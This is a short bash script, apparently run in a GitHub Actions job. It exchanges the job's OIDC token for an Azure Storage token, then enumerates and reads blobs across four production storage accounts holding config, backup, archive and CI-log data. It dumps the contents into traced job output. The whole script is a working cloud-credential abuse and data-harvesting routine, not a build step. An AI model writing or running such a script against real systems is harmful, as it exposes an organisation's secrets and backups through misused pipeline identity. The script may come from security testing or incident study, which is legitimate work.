#!/usr/bin/env bash
set -x

OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
ST=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" --data-urlencode "scope=https://storage.azure.com/.default" | jq -r .access_token)
echo "ST len: ${#ST}"

# List containers on ALL 4 storage accounts
for ACCT in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblcilogsprodx3euoz; do
  echo "=== $ACCT CONTAINERS ==="
  curl -s -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" \
    "https://$ACCT.blob.core.windows.net/?comp=list"
  echo
  
  # For each container found, list blobs AND try to read them
  CONTAINERS=$(curl -s -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" \
    "https://$ACCT.blob.core.windows.net/?comp=list" | grep -oP '<Name>[^<]+</Name>' | sed 's/<[^>]*>//g')
  for C in $CONTAINERS; do
    echo "--- $ACCT/$C blobs ---"
    LISTING=$(curl -s -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" \
      "https://$ACCT.blob.core.windows.net/$C?restype=container&comp=list")
    echo "$LISTING" | head -c 500
    echo
    
    # Extract blob names and try to read each
    BLOBS=$(echo "$LISTING" | grep -oP '<Name>[^<]+</Name>' | sed 's/<[^>]*>//g')
    for B in $BLOBS; do
      echo ">>> READ $ACCT/$C/$B:"
      curl -s -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" \
        "https://$ACCT.blob.core.windows.net/$C/$B" | head -c 500
      echo
    done
  done
done

echo "=== DONE ==="
